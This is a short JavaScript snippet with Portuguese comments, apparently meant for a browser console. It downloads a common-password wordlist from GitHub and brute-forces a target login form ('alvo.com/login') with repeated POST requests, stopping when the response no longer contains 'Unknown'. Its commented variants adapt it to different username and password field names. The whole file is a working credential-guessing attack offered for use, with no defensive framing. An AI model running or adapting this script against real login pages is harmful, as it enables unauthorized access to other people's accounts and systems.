// usar apenas uma wordlist por vez
// evitar localhost e ngrok, a idéia aqui é poupar armazenamento interno
// existem hospedagens gratuitas para subir uma wordlist

const url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';

fetch(url)
  .then(res => res.text())
  .then(text => {
    const passwords = text.split('\n').map(p => p.trim()).filter(Boolean);

    // ajustar a url do alvo antes de enviar
    // to pensando em adaptar com input no console ou com prompt para a próxima versão
    const loginUrl = 'https://alvo.com/login';

    (async () => {
      for (const password of passwords) {
        console.warn(`testando: ${password}`);

        const res = await fetch(loginUrl, {
          method: 'POST', //atenção aqui! Na maioria das vezes é POST, mas nem sempre... talvez eu coloque para declarar no início tbm
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
      //  ajustar o user/username e pass/password aqui
          body: `username=${encodeURIComponent(password)}&password=`
      //  body: `username=&password=${encodeURIComponent(password)}`
      //  body: `user=${encodeURIComponent(password)}&pass=`
      //  body: `user=&pass=${encodeURIComponent(password)}`
      //  sim... pura gambiarra. Podia fazer melhor? Podia! kkk
        });

        const body = await res.text();
        // ajustar filtro de parada, não me julguem, eu acho esse método mais eficiente na maioria dos casos
        if (!body.includes('Unknown')) {
          console.log(`sucesso: %c${password}`, `color: green`);
          break;
        }
      }
    })();
  });
